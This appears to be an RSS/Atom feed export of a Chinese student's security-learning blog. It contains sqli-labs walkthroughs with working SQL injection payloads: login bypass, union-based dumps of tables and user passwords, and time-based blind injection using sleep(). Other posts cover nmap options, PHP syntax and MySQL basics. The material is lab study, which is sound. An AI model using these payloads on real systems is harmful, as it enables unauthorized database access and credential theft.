concat(username)</code>，这样会引起报错：<img src="/2021/01/31/lesson17/8.png" alt="8"></p><p>原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。</p><p><img src="/2021/01/31/lesson17/9.png" alt="9"></p><p>2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制</p><p>回显内容。</p><p><strong>sp：回顾一下字符串连接函数</strong></p><p><strong>1.concat(str1,str2,…)——没有分隔符地连接字符串</strong><br><strong>2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串</strong><br><strong>3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lesson17：&quot;&gt;&lt;a href=&quot;#lesson17：&quot; class=&quot;headerlink&quot; title=&quot;lesson17：&quot;&gt;&lt;/a&gt;lesson17：&lt;/h1&gt;&lt;p&gt;这一关不管我们在username上构造什么payload都无法篡改数据库。&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson11-16</title>
    <link href="http://example.com/2021/01/30/lesson11-16/"/>
    <id>http://example.com/2021/01/30/lesson11-16/</id>
    <published>2021-01-30T14:56:26.000Z</published>
    <updated>2021-02-02T16:08:57.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><p>Q：什么是post</p><p>A：用户将数据从网页或者客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交， 提交到服务器后服务器再在数据库中进行验证。</p><p>Q：与get注入的区别</p><p>A：get请求不发送数据至服务器，而post请求包含数据提交</p><h3 id="post类型sql注入原理："><a href="#post类型sql注入原理：" class="headerlink" title="post类型sql注入原理："></a>post类型sql注入原理：</h3><p>将用户的输入当作代码/指令，在数据库中操作、执行。</p><h1 id="lesson11："><a href="#lesson11：" class="headerlink" title="lesson11："></a>lesson11：</h1><p>lesson11的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>通过查看lesson11的源码我们可以通过更改输入的内容进而修改数据库中代码，</p><p>如username=root‘ or ’1’=‘1，password=随意；发现登入成功。（username带入数据库为：@$sql=”SELECT username, password FROM users WHERE username=’$root‘ or ’1’=‘1’ and password=’$随意’ LIMIT 0,1”;我们可以看到只要数据库中存在用户root，那么这个语句恒成立）</p><p>那么我们可以进一步通过更改上传数据来达到获取数据库信息的目的。</p><h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/30/lesson11-16/1.png" alt="1"></p><h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/30/lesson11-16/2.png" alt="2"></p><h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/30/lesson11-16/3.png" alt="3"></p><h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>), (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得：<img src="/2021/01/30/lesson11-16/4.png" alt="4"></p><h1 id="lesson12："><a href="#lesson12：" class="headerlink" title="lesson12："></a>lesson12：</h1><p>lesson12的源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=($uname) <span class="keyword">and</span> <span class="keyword">password</span>=     ($passwd) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>查看源代码不是很能直观看出数据库如何闭合函数，我们通过网页检测其是如何闭合参数的：</p><p>username=a’a”a’)a</p><p>得：<img src="/2021/01/30/lesson11-16/5.png" alt="5"></p><p>我们通过观察password部分可知注入点为‘’）；</p><p>但是当我构造payload：root‘’）#时我发现页面返回错误，而且我发现这关无法通过注释达到篡改数据库。</p><p>剩下的和lesson11一样。</p><h1 id="lesson13："><a href="#lesson13：" class="headerlink" title="lesson13："></a>lesson13：</h1><p>通过查看源码，或在网页上输入错误sql语法，可知注入点为：‘）</p><p>但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。</p><h1 id="lesson14："><a href="#lesson14：" class="headerlink" title="lesson14："></a>lesson14：</h1><p>通过查看源码，或在网页上输入错误sql语法，可知注入点为 ：”</p><p>但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。</p><h1 id="lesson15："><a href="#lesson15：" class="headerlink" title="lesson15："></a>lesson15：</h1><p>无法通过sql语法错误来检测数据库闭合参数类型，</p><p>查看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&#x27;$uname&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$passwd&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>注入点为：’      ；</p><p>登入成功，无回显，盲注（参考第五关、第八关）。</p><h1 id="lesson16："><a href="#lesson16：" class="headerlink" title="lesson16："></a>lesson16：</h1><p>做这关的时候放了一个错误卡了好久：把“）型的双引号用两个单引号代替了，导致一直输入返回值错误。</p><p>查看源码可得注入点为：”)；</p><p>登入成功，无回显，盲注（参考第五关、第八关）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;post注入&quot;&gt;&lt;a href=&quot;#post注入&quot; class=&quot;headerlink&quot; title=&quot;post注入&quot;&gt;&lt;/a&gt;post注入&lt;/h2&gt;&lt;p&gt;Q：什么是post&lt;/p&gt;
&lt;p&gt;A：用户将数据从网页或者客户端提交 到服务器端，例如我们在登录过程中，输入</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>2021-1月web渗透培训(2)</title>
    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/"/>
    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/</id>
    <published>2021-01-27T02:56:06.000Z</published>
    <updated>2021-02-05T03:19:26.651Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入原理（web漏洞）：</p><p>将用户的输入当作代码/指令，在数据库中操作、执行</p><p>例如：用户名：admin 密码：123</p><p>正常带入数据库中执行：select *from users where username=‘admin’ and password=‘123’–返回正确，成功登入；</p><p>利用SQL注入：</p><p>构造payload：用户名：admin‘ or ’1‘=’1 密码=‘随意’；</p><p>带入数据库中执行：select *from users where username=‘admin‘ or ’1‘=’1’ and password=‘随意’–返回正确，成功登入；我们可以看到数据库误把用户的输入当做代码，整合到源码中，1=1恒成立故导致该语句恒成立。</p><p>注：数据库中 ‘ = ’ 优先级高于 ‘and’ 高于 ‘or’；</p><p>预防SQL注入：过滤用户的特殊输入（关键字：and等，字符：‘ 等），预编译（将用户的输入当作字符串，即不数据库不会执行夹杂在用户输入的代码中）；</p><p>判断是否存在SQL注入漏洞：</p><p>(1)?id=1’ –页面是否报错</p><p>(2)?id=1’ and ‘1’=’1–页面是否正常</p><p>(3)?id=1’ and ‘1’=’2–页面是否异常</p><p>若(1)报错(2)正常(3)异常则说明存在SQL注入漏洞。</p><p>参考ppt：<a href="https://kdocs.cn/l/crYKxbz6UgjE">https://kdocs.cn/l/crYKxbz6UgjE</a>  密码goktech</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SQL注入原理（web漏洞）：&lt;/p&gt;
&lt;p&gt;将用户的输入当作代码/指令，在数据库中操作、执行&lt;/p&gt;
&lt;p&gt;例如：用户名：admin 密码：123&lt;/p&gt;
&lt;p&gt;正常带入数据库中执行：select *from users where username=‘admin’ an</summary>
      
    
    
    
    
    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2021.1月web渗透培训</title>
    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/"/>
    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/</id>
    <published>2021-01-27T02:56:06.000Z</published>
    <updated>2021-01-29T03:13:47.624Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web渗透的宏观思路："><a href="#web渗透的宏观思路：" class="headerlink" title="web渗透的宏观思路："></a>web渗透的宏观思路：</h3><h5 id="a-信息收集"><a href="#a-信息收集" class="headerlink" title="a.信息收集"></a>a.信息收集</h5><h5 id="b-漏洞挖掘"><a href="#b-漏洞挖掘" class="headerlink" title="b.漏洞挖掘"></a>b.漏洞挖掘</h5><h5 id="c-漏洞利用"><a href="#c-漏洞利用" class="headerlink" title="c.漏洞利用"></a>c.漏洞利用</h5><h5 id="d-输出渗透测试报告"><a href="#d-输出渗透测试报告" class="headerlink" title="d.输出渗透测试报告"></a>d.输出渗透测试报告</h5><h4 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h4><p>1.基本信息：</p><p>《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家；</p><p>​    获取子域名–子域名挖掘机</p><p>​    获取域名或IP地址–<a href="http://viewdns.info、https//www.dnsdb.io">http://viewdns.info、https://www.dnsdb.io</a></p><p>​    根据IP地址查询同一IP地址的其他信息–<a href="http://114best.com/ip/114.aspx?w=">http://114best.com/ip/114.aspx?w=</a></p><p>《端口：80（http）443（HTTPS） 445（共享文件夹）；</p><p>《服务（web版本），服务版本；</p><p>2.os操作系统版本：</p><p>linux，wind，mac</p><p>3.web中间件（web程序，用来提供网页服务）</p><p>Apache（主流），iis，Nginx，weblogic</p><p>4.数据库</p><p>类型、版本：mysql，mssql，oracle，access</p><p>5.服务器后端的脚本类型、版本</p><p>PHP、JSP、ASP</p><h5 id="端口扫描技术–NMAP"><a href="#端口扫描技术–NMAP" class="headerlink" title="~端口扫描技术–NMAP"></a>~端口扫描技术–NMAP</h5><p>基本命令格式：nmap -参数 ip/ip段/主机地址</p><h6 id="Nmap-TCP扫描端口选项"><a href="#Nmap-TCP扫描端口选项" class="headerlink" title="Nmap TCP扫描端口选项:"></a>Nmap TCP扫描端口选项:</h6><p>-sP：用ping的方式判断是否有存活主机,不扫描端口。<br>-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。<br>-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。<br>-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防<br>火墙的过滤规则)。</p><h6 id="Nmap-UDP扫描端口选项"><a href="#Nmap-UDP扫描端口选项" class="headerlink" title="Nmap UDP扫描端口选项:"></a>Nmap UDP扫描端口选项:</h6><p>-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。</p><h6 id="Nmap目标端口选项"><a href="#Nmap目标端口选项" class="headerlink" title="Nmap目标端口选项:"></a>Nmap目标端口选项:</h6><p>-p：扫描指定的端口<br>-F：快速扫描100个常用的端口<br>-r：顺序扫描，按从小到大的顺序进行端口扫描</p><h6 id="Nmap输出选项"><a href="#Nmap输出选项" class="headerlink" title="Nmap输出选项:"></a>Nmap输出选项:</h6><p>-oN：标准输出为指定的文件<br>-oX：生成XML格式文件可以转换成HTML文件</p><h6 id="其他常用选项"><a href="#其他常用选项" class="headerlink" title="其他常用选项:"></a>其他常用选项:</h6><p>-sV：检测服务端软件版本信息<br>-O：检测操作系统信息<br>-Pn：禁用nmap的主机检测功能<br>-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p><p>注：nmap -sP ip段可检测该网段下所有存活的主机</p><p>本章参考ppt：<a href="https://kdocs.cn/l/ctOPJlaBJgUw">https://kdocs.cn/l/ctOPJlaBJgUw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;web渗透的宏观思路：&quot;&gt;&lt;a href=&quot;#web渗透的宏观思路：&quot; class=&quot;headerlink&quot; title=&quot;web渗透的宏观思路：&quot;&gt;&lt;/a&gt;web渗透的宏观思路：&lt;/h3&gt;&lt;h5 id=&quot;a-信息收集&quot;&gt;&lt;a href=&quot;#a-信息收集&quot; cla</summary>
      
    
    
    
    
    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法</title>
    <link href="http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/"/>
    <id>http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/</id>
    <published>2021-01-25T04:18:49.000Z</published>
    <updated>2021-02-03T03:45:18.625Z</updated>
    
    <content type="html"><![CDATA[<h5 id="PHP标记："><a href="#PHP标记：" class="headerlink" title="PHP标记："></a>PHP标记：</h5><p>我们主要使用&lt; ?php ?&gt; ；</p><h5 id="PHP中的分隔符："><a href="#PHP中的分隔符：" class="headerlink" title="PHP中的分隔符："></a>PHP中的分隔符：</h5><p>1、PHP中的“结构定义语句”（分支，循环，类，函数等{}结尾），不需要使用分号结尾。<br>2、PHP中的“功能执行语句”，不用{}结尾的，必须使用分号结尾。</p><h5 id="PHP中的变量："><a href="#PHP中的变量：" class="headerlink" title="PHP中的变量："></a>PHP中的变量：</h5><p>1.PHP是一种弱类型语言。变量无需声明，直接给变量赋值即可，并且可以在后续赋值过程中随时修改变量的数据类型。</p><p>2.PHP中可以使用连等同时声明多个变量，而不能使用逗号分隔。eg：$a=$b=$c=10</p><p>sp：PHP语法学习详情参考：<a href="https://www.cnblogs.com/suitongyu/p/7748153.html">https://www.cnblogs.com/suitongyu/p/7748153.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;PHP标记：&quot;&gt;&lt;a href=&quot;#PHP标记：&quot; class=&quot;headerlink&quot; title=&quot;PHP标记：&quot;&gt;&lt;/a&gt;PHP标记：&lt;/h5&gt;&lt;p&gt;我们主要使用&amp;lt; ?php ?&amp;gt; ；&lt;/p&gt;
&lt;h5 id=&quot;PHP中的分隔符：&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>C语言的解题思路</title>
    <link href="http://example.com/2020/12/24/blog9/"/>
    <id>http://example.com/2020/12/24/blog9/</id>
    <published>2020-12-24T08:41:40.000Z</published>
    <updated>2021-01-30T14:55:36.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h6 id="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"><a href="#学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。" class="headerlink" title="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"></a>学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。</h6><p>1.绝对偏差最小问题。</p><p>【题目】</p><p>输入某班级n(0&lt;n&lt; 100)个学生的成绩到数组a中，查找出所有成绩中与及格线(60分)绝对偏差最小的学生成绩，并输出该学生的成绩。</p><p>【思路】</p><p>先定义一个数组a[100],用for语句算出每一个数与60差的绝对值，然后定义一个变量m去存储最小绝对偏差值，同时用定义变量k去记存当绝对偏差值最小时i的值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;h6 id=&quot;学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>lesson9、lesson10</title>
    <link href="http://example.com/2020/12/13/blog%20j/"/>
    <id>http://example.com/2020/12/13/blog%20j/</id>
    <published>2020-12-13T14:20:36.000Z</published>
    <updated>2021-01-30T14:46:43.374Z</updated>
    
    <content type="html"><![CDATA[<h4 id="lesson9"><a href="#lesson9" class="headerlink" title="lesson9"></a>lesson9</h4><p>这题很有意思，我发现不管输入什么，返回值都是you are in，于是我查看源代码——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">  echo &#39;You are in...........&#39;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">echo &#39;You are in...........&#39;;</span><br><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br><span class="line">&#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到不论输入结果正确与否输出都为you are in</p><p>通过题目我们知道注入点为 ’</p><p>于是我觉得可以利用时间盲注，通过延时判断语句正确与否，于是输入爆库语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>发现可行，那么剩下的内容和lesson8就一模一样了。</p><h4 id="lesson10"><a href="#lesson10" class="headerlink" title="lesson10"></a>lesson10</h4><p>这题基于lesson9，但注入点有别于lesson9为 ‘’</p><p>其余的也一样了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;lesson9&quot;&gt;&lt;a href=&quot;#lesson9&quot; class=&quot;headerlink&quot; title=&quot;lesson9&quot;&gt;&lt;/a&gt;lesson9&lt;/h4&gt;&lt;p&gt;这题很有意思，我发现不管输入什么，返回值都是you are in，于是我查看源代码——&lt;/p&gt;
&lt;f</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lessen8</title>
    <link href="http://example.com/2020/12/13/blog%20i/"/>
    <id>http://example.com/2020/12/13/blog%20i/</id>
    <published>2020-12-13T07:23:18.000Z</published>
    <updated>2021-01-30T14:46:52.228Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>首先输入——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1--+</span><br></pre></td></tr></table></figure><p>页面回显you are in</p><p>接着打开源码查看到——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>则注入点为 ‘   ，输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or 1&#x3D;1--+</span><br></pre></td></tr></table></figure><p>回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>他对mysql报错语句进行了注释，即这关不能用报错注入。</p><p>于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line">或</span><br><span class="line">?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>发现可以行得通，那么本题使用时间盲注无疑了。</p><h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><p>输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-爆库&quot;&gt;&lt;a href=&quot;#一-爆库&quot; class=&quot;headerlink&quot; title=&quot;一.爆库&quot;&gt;&lt;/a&gt;一.爆库&lt;/h4&gt;&lt;p&gt;首先输入——&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>mysql</title>
    <link href="http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
    <id>http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</id>
    <published>2020-12-07T08:25:42.000Z</published>
    <updated>2021-04-10T06:03:28.612Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><h4 id="一-MySQL的增删改查语句。"><a href="#一-MySQL的增删改查语句。" class="headerlink" title="一.MySQL的增删改查语句。"></a>一.MySQL的增删改查语句。</h4><h5 id="1-增：有四种方法"><a href="#1-增：有四种方法" class="headerlink" title="1.增：有四种方法"></a>1.增：有四种方法</h5><p>a.使用insert插入单行数据；语法格式为insert into 表名（列名） values （’列值’）；</p><p>例如：insert into lcj（姓名，班级，座号）values （‘小林’，‘网安一班’，‘30’）；</p><p>b.insert 表名 set 列名=‘列值’，列名=‘列值’……..</p><p>注：增加的列值是填充在新一行。</p><h5 id="2-删："><a href="#2-删：" class="headerlink" title="2.删："></a>2.删：</h5><h6 id="a-使用delete删除数据；语法格式为delete-from-表名-；可在表名后面加where语句来充当条件语句。"><a href="#a-使用delete删除数据；语法格式为delete-from-表名-；可在表名后面加where语句来充当条件语句。" class="headerlink" title="a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。"></a>a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。</h6><h6 id="例如：delete-from-lcj-where-name-‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）"><a href="#例如：delete-from-lcj-where-name-‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）" class="headerlink" title="例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）"></a>例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）</h6><h5 id="3-改："><a href="#3-改：" class="headerlink" title="3.改："></a>3.改：</h5><h6 id="a-运用update对原1列值进行改动；语法update-表名-set-列名-更新值；例如：update-lcj-set-座号-1；可在更新值后面加where语句来充当条件语句；"><a href="#a-运用update对原1列值进行改动；语法update-表名-set-列名-更新值；例如：update-lcj-set-座号-1；可在更新值后面加where语句来充当条件语句；" class="headerlink" title="a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；"></a>a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；</h6><h5 id="4-查："><a href="#4-查：" class="headerlink" title="4.查："></a>4.查：</h5><h6 id="a-查表中的所有数据：select-from-表名；"><a href="#a-查表中的所有数据：select-from-表名；" class="headerlink" title="a.查表中的所有数据：select *from 表名；"></a>a.查表中的所有数据：select *from 表名；</h6><p>b.</p><h4 id="二-MySQL语句使用练习。"><a href="#二-MySQL语句使用练习。" class="headerlink" title="二.MySQL语句使用练习。"></a>二.MySQL语句使用练习。</h4><p>1.建立数据库：create database class character set gbk;   其中class为数据库名。</p><p>2.使用数据库：use class；</p><p>3.创建表：create table a（列名 数据类型）；其中a为表名。 如：{   create table class(name varchar(20));    }</p><p>4.查看表数据（值）：select *form a；</p><p>5.查看表结构：desc a；</p><h4 id="三-特殊的"><a href="#三-特殊的" class="headerlink" 